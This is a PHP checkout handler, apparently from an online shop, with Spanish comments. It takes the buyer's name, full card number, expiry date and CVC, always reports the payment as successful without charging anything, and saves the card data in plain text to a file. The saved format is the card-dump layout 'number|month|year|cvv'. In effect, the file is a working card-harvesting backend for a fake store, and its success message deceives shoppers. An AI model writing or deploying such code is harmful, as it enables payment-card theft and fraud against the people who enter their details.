<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Datos de Envío (se captura el país para el panel, los demás no se guardan en el TXT)
    $country = htmlspecialchars($_POST['country'] ?? '');
    // Los demás datos de dirección se capturan en checkout.php pero NO se guardan en base_clientes.txt según tu solicitud
    // $address1 = htmlspecialchars($_POST['address1'] ?? '');
    // $address2 = htmlspecialchars($_POST['address2'] ?? '');
    // $city = htmlspecialchars($_POST['city'] ?? '');
    // $state = htmlspecialchars($_POST['state'] ?? '');
    // $zip_code = htmlspecialchars($_POST['zip_code'] ?? '');

    // Datos de Pago
    $card_name = htmlspecialchars($_POST['card_name'] ?? '');
    $card_number_raw = str_replace(' ', '', $_POST['card_number'] ?? ''); // Elimina espacios del número
    $expiry_date_raw = $_POST['expiry_date'] ?? ''; // Formato MM/AA
    $cvc_raw = $_POST['cvc'] ?? '';

    // Desglosar la fecha de caducidad en mes y año
    $expiry_parts = explode('/', $expiry_date_raw);
    $month = $expiry_parts[0] ?? '';
    $year = $expiry_parts[1] ?? ''; // Esto es 'AA', por ejemplo '25' para 2025

    // --- SIMULACIÓN DE PAGO ---
    $payment_successful = true; // Aquí es donde una pasarela de pago real procesaría la transacción

    if ($payment_successful) {
        $log_file = 'base_clientes.txt'; // Archivo para guardar los datos
        $timestamp = date('Y-m-d H:i:s');
        // $ip_address = $_SERVER['REMOTE_ADDR']; // Se puede añadir si se necesita en el futuro

        // Formato deseado para la tarjeta: numerodetarjeta|mes|año|cvv
        // ADVERTENCIA DE SEGURIDAD EXTREMA: NUNCA GUARDES DATOS DE TARJETA EN TEXTO PLANO EN PRODUCCIÓN
        $formatted_card_data = $card_number_raw . '|' . $month . '|' . $year . '|' . $cvc_raw;

        // Contenido a guardar
        $data_to_save = "--- Transacción ---\n";
        $data_to_save .= "Timestamp: " . $timestamp . "\n";
        $data_to_save .= "País: " . $country . "\n";
        $data_to_save .= "Nombre Titular: " . $card_name . "\n";
        $data_to_save .= "Tarjeta: " . $formatted_card_data . "\n"; // Datos de la tarjeta en el formato deseado
        $data_to_save .= "-------------------\n\n"; // Separador para cada transacción

        // Guarda los datos en el archivo
        file_put_contents($log_file, $data_to_save, FILE_APPEND | LOCK_EX);

        // Vacia el carrito después del pago exitoso
        $_SESSION['cart'] = [];

        // Mensaje de éxito
        $_SESSION['message'] = "¡Pago efectuado con éxito! Gracias por tu compra.";
        $_SESSION['message_type'] = "success";

    } else {
        $_SESSION['message'] = "Hubo un error al procesar tu pago. Inténtalo de nuevo.";
        $_SESSION['message_type'] = "error";
    }

    header('Location: index.php'); // Redirige a la página principal después del procesamiento
    exit();
} else {
    // Si se accede directamente a process_payment.php sin POST, redirige
    header('Location: index.php');
    exit();
}
?>